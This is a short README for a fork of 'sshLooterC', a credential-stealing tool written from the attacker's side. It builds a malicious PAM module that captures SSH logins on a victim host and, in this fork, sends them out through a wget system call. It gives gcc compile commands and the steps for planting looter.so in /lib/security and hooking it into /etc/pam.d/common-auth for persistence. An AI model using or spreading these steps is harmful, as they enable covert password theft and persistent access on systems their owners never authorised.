# sshLooterC forked

<a href="https://github.com/mthbernardes/sshLooterC">https://github.com/mthbernardes/sshLooterC</a>

# Changes from the original project
* Removed libcurl4-openssl-dev dependency, now using <b>system("wget ...")</b>
* Compiled for 32bit arch on a 64bit system, you need to install <b>gcc-multilib</b> on the attacker machine
* I coded <b>callLooter.c</b> to test the library before installation on the target


# Dependencies
* PAM dev library: <b>libpam0g-dev</b>
* [Optional] To compile the program for 32bit arch you need to install <b>gcc-multilib</b> on a 64bit system

# Compilation
~~~~
gcc callLooter.c -o callLooter -m32 -ldl
gcc -m32 -Werror -Wall -fPIC -shared -o looter.so looter2.c
~~~~
The m32 switch is optional and allows to compile the files for a 32bit victim on a 64bit attacker machine

# Usage
Copy the <b>looter.so</b> to victim machine on <b>/lib/security</b>, then append to <b>/etc/pam.d/common-auth</b> the following lines:
~~~~
auth optional looter.so
account optional looter.so
~~~~
# Credits
<a href="https://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html" target="_blank">Stealing SSH credentials Another Approach.</a>
<br/>

 
